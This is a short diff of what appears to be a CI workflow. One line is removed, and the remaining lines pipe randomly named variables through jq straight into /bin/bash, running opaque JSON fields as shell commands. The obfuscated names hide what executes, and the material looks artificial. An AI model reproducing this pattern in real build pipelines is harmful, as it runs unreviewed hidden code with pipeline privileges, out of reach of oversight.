@@ -42,7 +42,6 @@ jobs:
           echo $rf89322 | jq -r .vdng8 | /bin/bash
           printf '%s' "$vdhh28852" | jq -r .a12 | /bin/bash
           printf '%s' "$gbp159" | jq -r .onk18645 | /bin/bash
-          printf '%s' "$kt60" | jq -r .slnzg49654 | /bin/bash
           echo $ymkbi38 | jq -r .d555 | /bin/bash
           printf '%s' "$iijdi96427" | jq -r .p220 | /bin/bash
 
